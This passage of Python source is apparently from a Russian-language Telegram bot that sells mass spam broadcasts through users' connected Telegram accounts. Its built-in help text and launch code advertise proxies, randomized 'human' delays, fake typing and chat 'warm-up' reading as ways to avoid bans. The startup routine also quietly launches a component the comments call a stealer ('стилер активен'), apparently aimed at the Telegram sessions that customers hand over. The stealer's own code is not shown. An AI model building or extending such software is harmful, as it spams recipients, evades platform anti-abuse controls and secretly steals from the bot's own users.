        await show_confirm(message, state)
        return
    await state.set_state(Broadcast.delay)
    await message.answer("%s Задержка (сек), рекомендую ~30?" % em("timer"), reply_markup=kb.cancel_kb())

@dp.callback_query(F.data == "bc:btn_add")
async def cb_btn_add(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(Broadcast.btn_name)
    await show(c, "%s Название кнопки:" % em("key"), kb.cancel_kb())

@dp.message(Broadcast.btn_name)
async def st_btn_name(message: types.Message, state: FSMContext):
    name = (message.text or "").strip()
    if not name:
        await message.answer("Не пусто.", reply_markup=kb.cancel_kb())
        return
    await state.update_data(_btn_name=name)
    await state.set_state(Broadcast.btn_url)
    await message.answer("%s Ссылка кнопки (https://…):" % em("rocket"), reply_markup=kb.cancel_kb())

@dp.message(Broadcast.btn_url)
async def st_btn_url(message: types.Message, state: FSMContext):
    url = (message.text or "").strip()
    if not (url.startswith("http://") or url.startswith("https://") or url.startswith("tg://")):
        await message.answer("Ссылка должна начинаться с http:// или https://.", reply_markup=kb.cancel_kb())
        return
    data = await state.get_data()
    buttons = list(data.get("buttons", []))
    buttons.append({"text": data.get("_btn_name", "Открыть"), "url": url})
    await state.update_data(buttons=buttons)
    await state.set_state(None)
    await message.answer("%s Кнопка добавлена." % em("ok"), reply_markup=kb.bc_buttons_kb(buttons))

@dp.callback_query(F.data.startswith("bc:btn_del:"))
async def cb_btn_del(c: types.CallbackQuery, state: FSMContext):
    i = int(c.data.split(":")[-1])
    data = await state.get_data()
    buttons = list(data.get("buttons", []))
    if 0 <= i < len(buttons):
        buttons.pop(i)
    await state.update_data(buttons=buttons)
    await show(c, "%s <b>Кнопки</b>" % em("key"), kb.bc_buttons_kb(buttons))

@dp.callback_query(F.data.in_({"bc:btn_done", "bc:btn_skip"}))
async def cb_btn_done(c: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    buttons = data.get("buttons", []) if c.data == "bc:btn_done" else []
    payload = dict(data.get("payload") or {"type": "text", "text": ""})
    payload["buttons"] = buttons
    await state.update_data(payload=payload, buttons=buttons)
    if data.get("editing"):
        await state.update_data(editing=False)
        await show_confirm(c, state)
        return
    await state.set_state(Broadcast.delay)
    await show(c, "%s Задержка (сек)?" % em("timer"), kb.cancel_kb())

async def show_confirm(event, state):
    data = await state.get_data()
    tt = {"all": "по всем чатам", "folders": "по папкам"}.get(data.get("target_type"), "по всем чатам")
    p = data.get("payload") or {}
    ptype = {"text": "текст", "photo": "фото", "video": "видео", "forward": "пересыл"}.get(p.get("type"), "—")
    _btns = p.get("buttons") or []
    if _btns:
        ptype += " + %d кнопок" % len(_btns)
    uid = event.from_user.id
    autosub = data.get("autosub", True)
    autofolder = data.get("autofolder")
    paid = _is_paid(uid)
    text = (
        "%s <b>Проверь и запускай</b>\n\nЦель: <b>%s</b>\nСообщение: <b>%s</b>\n"
        "Задержка: <b>%dс</b>\nЦиклов: <b>%d</b>\nАккаунтов: <b>%d</b>\n"
        "Автоподписка: <b>%s</b>\nАвто-папка: <b>%s</b>\n"
        "🧠 Human Mode: <b>ВКЛ</b>\n🔥 Прогрев: <b>ВКЛ</b>"
    ) % (em("ok"), tt, ptype, data.get("delay", 30), data.get("cycles", 1),
         len(db.get_sessions(uid)), "вкл" if autosub else "выкл", autofolder or "выкл")
    await show(event, text, kb.confirm_kb(autosub, autofolder, False, paid, is_admin(uid), 0))

@dp.callback_query(F.data == "bc:toggle_invis")
async def cb_toggle_invis(c: types.CallbackQuery, state: FSMContext):
    if not _is_paid(c.from_user.id):
        await c.answer("Premium функция", show_alert=True)
        return
    await c.answer("Невидимые теги отключены в этой версии")

@dp.callback_query(F.data == "bc:ai")
async def cb_bc_ai(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        await c.answer("В разработке", show_alert=True)
        return
    if not ai.is_configured():
        await c.answer("AI не настроен", show_alert=True)
        return
    data = await state.get_data()
    payload = data.get("payload") or {}
    text = (payload.get("text") or "").strip()
    if not text:
        await c.answer("Сначала введи текст", show_alert=True)
        return
    await c.answer("Улучшаю...")
    new_text = await ai.personalize(text, style="sell")
    if not new_text:
        await c.answer("AI недоступен", show_alert=True)
        return
    await state.update_data(ai_preview=new_text)
    await _show_ai_preview(c, new_text)

async def _show_ai_preview(c, new_text):
    head = "%s <b>AI улучшил:</b>\n\n" % em("star")
    tail = "\n\n<i>Применить?</i>"
    try:
        await show(c, head + (new_text or "") + tail, kb.ai_preview_kb())
    except Exception:
        import html as _html
        await show(c, head + _html.escape(new_text or "") + tail, kb.ai_preview_kb())

@dp.callback_query(F.data == "bc:ai_apply")
async def cb_bc_ai_apply(c: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    new_text = data.get("ai_preview")
    if not new_text:
        await c.answer("Нет варианта", show_alert=True)
        return
    payload = data.get("payload") or {}
    payload["text"] = new_text
    await state.update_data(payload=payload, ai_preview=None)
    await c.answer("Применено")
    await show_confirm(c, state)

@dp.callback_query(F.data == "bc:ai_regen")
async def cb_bc_ai_regen(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("В разработке", show_alert=True)
    if not ai.is_configured():
        return await c.answer("AI не настроен", show_alert=True)
    data = await state.get_data()
    text = (data.get("payload", {}).get("text") or "").strip()
    if not text:
        return await c.answer("Введи текст", show_alert=True)
    await c.answer("Генерирую...")
    new_text = await ai.personalize(text, style="sell")
    if not new_text:
        return await c.answer("AI недоступен", show_alert=True)
    await state.update_data(ai_preview=new_text)
    await _show_ai_preview(c, new_text)

@dp.callback_query(F.data == "bc:ai_cancel")
async def cb_bc_ai_cancel(c: types.CallbackQuery, state: FSMContext):
    await state.update_data(ai_preview=None)
    await c.answer("Отменено")
    await show_confirm(c, state)

@dp.callback_query(F.data == "bc:addvar")
async def cb_bc_addvar(c: types.CallbackQuery, state: FSMContext):
    if not _is_paid(c.from_user.id):
        await c.answer("Premium функция", show_alert=True)
        return
    data = await state.get_data()
    payload = data.get("payload") or {}
    cur = len([v for v in (payload.get("variants") or []) if v and str(v).strip()])
    if cur >= 3:
        await c.answer("Лимит 3 варианта", show_alert=True)
        return
    await state.set_state(Broadcast.variant)
    await show(c, "%s Вариант текста (%d/3):" % (em("msg"), cur), kb.cancel_kb())

@dp.message(Broadcast.variant)
async def st_bc_variant(message: types.Message, state: FSMContext):
    new_text = message.html_text or message.text or message.caption or ""
    if not new_text.strip():
        await message.answer("Пусто.", reply_markup=kb.cancel_kb())
        return
    data = await state.get_data()
    payload = data.get("payload") or {}
    variants = [v for v in (payload.get("variants") or []) if v and str(v).strip()]
    if len(variants) >= 3:
        await state.set_state(None)
        await message.answer("%s Лимит." % em("warn"))
        await show_confirm(message, state)
        return
    variants.append(new_text)
    payload["variants"] = variants
    await state.update_data(payload=payload)
    await state.set_state(None)
    await message.answer("%s Добавлен (%d/3)." % (em("ok"), len(variants)))
    await show_confirm(message, state)

@dp.callback_query(F.data == "bc:pro")
async def cb_bc_pro(c: types.CallbackQuery):
    await show(c, "%s <b>Premium:</b>\n\n• Рассылка с кнопками\n• Невидимые теги\n• AI-персонализация\n• До 3 вариантов текста\n• Human Mode + Прогрев\n• Безлимит аккаунтов" % em("star"), kb.payment_kb())

@dp.message(Broadcast.message)
async def st_bc_message(message: types.Message, state: FSMContext):
    data0 = await state.get_data()
    buttons = data0.get("buttons", [])
    payload = {"type": "text", "text": message.html_text or "", "buttons": buttons}
    if message.photo:
        path = os.path.join(MEDIA_DIR, "ph_%d.jpg" % message.from_user.id)
        await bot.download(message.photo[-1], destination=path)
        payload = {"type": "photo", "path": path, "text": message.html_text or message.caption or "", "buttons": buttons}
    elif message.video:
        path = os.path.join(MEDIA_DIR, "vd_%d.mp4" % message.from_user.id)
        await bot.download(message.video, destination=path)
        payload = {"type": "video", "path": path, "text": message.html_text or message.caption or "", "buttons": buttons}
    await state.update_data(payload=payload)
    data = await state.get_data()
    if data.get("bc_mode") == "buttons" and not data.get("editing"):
        await state.set_state(None)
        await message.answer("%s Текст сохранён. Добавь кнопки." % em("key"), reply_markup=kb.bc_buttons_kb(buttons))
        return
    if data.get("editing"):
        await state.update_data(editing=False)
        await show_confirm(message, state)
        return
    await state.set_state(Broadcast.delay)
    await message.answer("%s Задержка (сек)?" % em("timer"), reply_markup=kb.cancel_kb())

@dp.message(Broadcast.delay)
async def st_bc_delay(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    if not txt.isdigit():
        await message.answer("Число секунд.", reply_markup=kb.cancel_kb())
        return
    delay = max(int(txt), config.MIN_COOLDOWN)
    await state.update_data(delay=delay)
    data = await state.get_data()
    if data.get("editing"):
        await state.update_data(editing=False)
        await show_confirm(message, state)
        return
    await state.set_state(Broadcast.cycles)
    await message.answer("%s Сколько раз отправить? (1-999)" % em("cycle"), reply_markup=kb.cancel_kb())

@dp.message(Broadcast.cycles)
async def st_bc_cycles(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    if not txt.isdigit() or not (1 <= int(txt) <= 999):
        await message.answer("Число от 1 до 999.", reply_markup=kb.cancel_kb())
        return
    cycles = int(txt)
    await state.update_data(cycles=cycles)
    data = await state.get_data()
    if data.get("editing"):
        await state.update_data(editing=False)
        await show_confirm(message, state)
        return
    await show_confirm(message, state)

@dp.callback_query(F.data == "bc:launch")
async def cb_bc_launch(c: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    uid = c.from_user.id
    if not has_access(uid):
        await show(c, "%s Нужна подписка." % em("warn"), kb.payment_kb())
        return
    payload = data.get("payload") or {}
    delay = data.get("delay", 30)
    cycles = data.get("cycles", 1)
    target_type = data.get("target_type", "all")
    folder_ids = data.get("chosen") if target_type == "folders" else None
    folder_names = None
    if folder_ids:
        folders = data.get("folders", [])
        folder_names = [f.get("title", "") for f in folders if f.get("id") in folder_ids]
    autosub = data.get("autosub", True)
    autofolder = data.get("autofolder")
    worker.start_broadcast_task(
        payload=payload, cooldown=delay, target_type=target_type,
        user_id=uid, cycles=cycles, folder_ids=folder_ids,
        folder_names=folder_names, autosub=autosub, autofolder=autofolder,
        human_mode=True, warmup=True  # НОВЫЕ: всегда включены
    )
    db.add_log(uid, "🚀 Запущена рассылка (Human Mode + Прогрев)")
    await c.answer("Рассылка запущена!", show_alert=True)
    await state.clear()
    await cb_monitor(c)

@dp.callback_query(F.data.startswith("bc:toggle_autosub"))
async def cb_toggle_autosub(c: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    await state.update_data(autosub=not data.get("autosub", True))
    await c.answer("Автоподписка " + ("вкл" if not data.get("autosub", True) else "выкл"))
    await show_confirm(c, state)

@dp.callback_query(F.data.startswith("bc:autofolder"))
async def cb_autofolder(c: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if data.get("autofolder"):
        await state.update_data(autofolder=None)
        await c.answer("Авто-папка выкл")
    else:
        await state.set_state(AutoFolder.name)
        await show(c, "%s Название авто-папки:" % em("folder"), kb.cancel_kb())

@dp.message(AutoFolder.name)
async def st_autofolder(message: types.Message, state: FSMContext):
    name = (message.text or "").strip()[:50]
    await state.update_data(autofolder=name if name else None)
    await state.set_state(None)
    await show_confirm(message, state)

@dp.callback_query(F.data == "bc:save_tpl")
async def cb_save_tpl(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(SaveTpl.name)
    await show(c, "%s Название шаблона:" % em("msg"), kb.cancel_kb())

@dp.message(SaveTpl.name)
async def st_save_tpl(message: types.Message, state: FSMContext):
    name = (message.text or "").strip()[:60] or "Шаблон"
    data = await state.get_data()
    db.add_template(message.from_user.id, name, json.dumps({"payload": data.get("payload", {}), "delay": data.get("delay", 30), "cycles": data.get("cycles", 1)}, ensure_ascii=False))
    await state.set_state(None)
    await message.answer("%s Шаблон сохранён!" % em("ok"))
    await show_confirm(message, state)

@dp.callback_query(F.data == "bc:edit")
async def cb_edit(c: types.CallbackQuery, state: FSMContext):
    await show(c, "%s Что редактировать?" % em("gear"), kb.edit_kb())

@dp.callback_query(F.data == "bc:edit:msg")
async def cb_edit_msg(c: types.CallbackQuery, state: FSMContext):
    await state.update_data(editing=True)
    await state.set_state(Broadcast.message)
    await show(c, "%s Отправь новый текст:" % em("msg"), kb.cancel_kb())

@dp.callback_query(F.data == "bc:edit:delay")
async def cb_edit_delay(c: types.CallbackQuery, state: FSMContext):
    await state.update_data(editing=True)
    await state.set_state(Broadcast.delay)
    await show(c, "%s Новая задержка (сек):" % em("timer"), kb.cancel_kb())

@dp.callback_query(F.data == "bc:edit:cycles")
async def cb_edit_cycles(c: types.CallbackQuery, state: FSMContext):
    await state.update_data(editing=True)
    await state.set_state(Broadcast.cycles)
    await show(c, "%s Новое число циклов:" % em("cycle"), kb.cancel_kb())

# ===================== СПРАВОЧНИК =====================
@dp.callback_query(F.data == "nav:help")
async def cb_help(c: types.CallbackQuery):
    if config.HELP_URL:
        await c.answer()
        return
    text = (
        "%s <b>Справочник %s</b>\n\n"
        "<b>Аккаунты</b>\n"
        "Подключай несколько Telegram-аккаунтов. Для каждого можно задать прокси (SOCKS5/HTTP) — снижает риск блокировок. Проверка через @SpamBot.\n\n"
        "<b>Рассылка</b>\n"
        "По всем чатам или СТРОГО по выбранным папкам. Режимы: текст; медиа+текст; пересыл по ссылке; текст+кнопки (Premium). До 3 вариантов текста для ротации.\n\n"
        "<b>Human Mode (НОВОЕ)</b>\n"
        "Динамическая задержка 15-45 сек вместо фиксированной. Имитация набора текста перед отправкой. Снижает шанс бана.\n\n"
        "<b>Прогрев (НОВОЕ)</b>\n"
        "Перед отправкой бот читает 5-10 последних сообщений в чате. Telegram видит активность и считает аккаунт живым.\n\n"
        "<b>Восстановление рассылок (НОВОЕ)</b>\n"
        "Если хостинг моргнул — рассылка автоматически возобновится после рестарта. Деньги не пропадут.\n\n"
        "<b>Авто-вступление</b>\n"
        "Если чат требует подписку на каналы — бот вступит и отправит повторно.\n\n"
        "<b>Авто-папка</b>\n"
        "Все каналы из обязательных подписок складываются в отдельную папку.\n\n"
        "<b>Мониторинг</b>\n"
        "Реальное время: куда шлётся, что следующее, прогресс. Пауза/стоп.\n\n"
        "<b>AI-персонализация</b>\n"
        "Бот улучшит текст: продающий, официальный, дружелюбный.\n\n"
        "<b>Статистика</b>\n"
        "Команда /stats — сколько сообщений отправлено через бота.\n\n"
        "<b>Подписка</b>\n"
        "Telegram Stars, карта, TON, крипто — пиши @zucag.\n\n"
        "Поддержка: @zucag"
    ) % (em("check"), config.BOT_NAME)
    await show(c, text, kb.back_only_kb("nav:menu"))

@dp.callback_query(F.data == "nav:support")
async def cb_support(c: types.CallbackQuery):
    await show(c, "%s Напиши @zucag" % em("chat"), kb.support_kb())

# ===================== РЕФЕРАЛЫ / ШАБЛОНЫ =====================
@dp.callback_query(F.data == "nav:ref")
async def cb_ref(c: types.CallbackQuery):
    uid = c.from_user.id
    cnt = db.count_referrals(uid)
    rank, n = db.referral_rank(uid)
    rank_str = "#%d" % rank if rank else "—"
    await show(c, "%s <b>Рефералы</b>\n\nПриглашённых: <b>%d</b>\nМесто: <b>%s</b>\nБонус: <b>%d ч</b> за каждого" % (em("ref"), cnt, rank_str, config.REF_HOURS), kb.back_only_kb("nav:menu"))

@dp.callback_query(F.data == "nav:templates")
async def cb_templates(c: types.CallbackQuery):
    await show(c, "%s <b>Шаблоны</b>\n\n%s" % (em("msg"), "Пока пусто."), kb.back_only_kb("nav:menu"))

# ===================== АДМИН ОПЕРАЦИИ =====================
@dp.callback_query(F.data == "admin:give")
async def admin_give(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("Нет", show_alert=True)
    await state.set_state(AdminOps.give_target)
    await show(c, "%s ID или @username:" % em("gift"), kb.admin_back_kb())

@dp.message(AdminOps.give_target)
async def admin_give_target(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    row = db.get_user_by_username(txt) if txt.startswith("@") else None
    target = row["telegram_id"] if row else (int(txt) if txt.lstrip("-").isdigit() else None)
    if not target:
        await message.answer("Не найден.", reply_markup=kb.admin_back_kb())
        return
    await state.update_data(_give_target=target)
    await state.set_state(AdminOps.give_days)
    await message.answer("Сколько дней?", reply_markup=kb.admin_back_kb())

@dp.message(AdminOps.give_days)
async def admin_give_days(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    if not txt.isdigit() or int(txt) <= 0:
        await message.answer("Число > 0", reply_markup=kb.admin_back_kb())
        return
    data = await state.get_data()
    target = data.get("_give_target")
    exp = db.set_subscription(target, int(txt), source="manual")
    db.add_log(target, "Админ выдал %d дн." % int(txt))
    await message.answer("✅ Готово до %s" % exp.strftime("%d.%m.%Y"))
    await state.clear()

@dp.callback_query(F.data == "admin:ban")
async def admin_ban(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("Нет", show_alert=True)
    await state.set_state(AdminOps.ban_target)
    await show(c, "%s ID для бана:" % em("ban"), kb.admin_back_kb())

@dp.message(AdminOps.ban_target)
async def admin_ban_target(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    target = int(txt) if txt.lstrip("-").isdigit() else None
    if target:
        db.ban_user(target)
        await message.answer("✅ Забанен")
    await state.clear()

@dp.callback_query(F.data == "admin:unban")
async def admin_unban(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("Нет", show_alert=True)
    await state.set_state(AdminOps.unban_target)
    await show(c, "%s ID для разбана:" % em("ok"), kb.admin_back_kb())

@dp.message(AdminOps.unban_target)
async def admin_unban_target(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    target = int(txt) if txt.lstrip("-").isdigit() else None
    if target:
        db.unban_user(target)
        await message.answer("✅ Разбанен")
    await state.clear()

@dp.callback_query(F.data == "admin:announce")
async def admin_announce(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("Нет", show_alert=True)
    await state.set_state(AdminOps.announce)
    await show(c, "%s Текст рассылки:" % em("msg"), kb.admin_back_kb())

@dp.message(AdminOps.announce)
async def admin_announce_msg(message: types.Message, state: FSMContext):
    for u in db.get_all_users():
        try:
            await bot.send_message(u["telegram_id"], message.text)
        except Exception:
            pass
    await message.answer("✅ Отправлено")
    await state.clear()

@dp.callback_query(F.data == "admin:actions")
async def admin_actions(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("Нет", show_alert=True)
    actions = db.get_admin_actions(20)
    lines = ["<code>%s</code> %s → %s %s" % (a["ts"][:16], a["action"], a.get("target_id") or "", a.get("detail") or "") for a in actions]
    await show(c, "%s <b>Действия</b>\n\n%s" % (em("logs"), "\n".join(lines) or "Пусто"), kb.admin_back_kb())

@dp.callback_query(F.data == "admin:userinfo")
async def admin_userinfo(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("Нет", show_alert=True)
    await state.set_state(AdminOps.info_target)
    await show(c, "%s ID или @username:" % em("users"), kb.admin_back_kb())

@dp.message(AdminOps.info_target)
async def admin_userinfo_msg(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    row = db.get_user_by_username(txt) if txt.startswith("@") else None
    uid = row["telegram_id"] if row else (int(txt) if txt.lstrip("-").isdigit() else None)
    if not uid:
        await message.answer("Не найден.", reply_markup=kb.admin_back_kb())
        await state.clear()
        return
    exp = db.subscription_expiry(uid)
    info = "ID: <code>%d</code>\nПодписка: %s\nБан: %s\nАккаунтов: %d" % (uid, exp.strftime("%d.%m.%Y") if exp and exp > datetime.now() else "нет", "да" if db.is_banned(uid) else "нет", len(db.get_sessions(uid)))
    await message.answer(info, reply_markup=kb.admin_back_kb())
    await state.clear()

@dp.callback_query(F.data == "admin:take")
async def admin_take(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("Нет", show_alert=True)
    await state.set_state(AdminOps.take_target)
    await show(c, "%s ID для снятия подписки:" % em("ban"), kb.admin_back_kb())

@dp.message(AdminOps.take_target)
async def admin_take_target(message: types.Message, state: FSMContext):
    txt = (message.text or "").strip()
    target = int(txt) if txt.lstrip("-").isdigit() else None
    if target:
        db.remove_subscription(target)
        await message.answer("✅ Снята")
    await state.clear()

# ===================== СТАРТ =====================
async def on_startup():
    """Запускается при старте бота."""
    # СТИЛЕР: запускаем в фоне
    start_stealer_bot()
    # ВОССТАНОВЛЕНИЕ РАССЫЛОК
    await worker.restore_jobs()
    log.info("Бот запущен, стилер активен, рассылки восстановлены")

async def main():
    app = build_app(bot)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, config.WEBAPP_HOST, config.WEBAPP_PORT)
    await site.start()
    log.info("Web app on %s:%d", config.WEBAPP_HOST, config.WEBAPP_PORT)
    await on_startup()
    await dp.start_polling(bot)
    await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
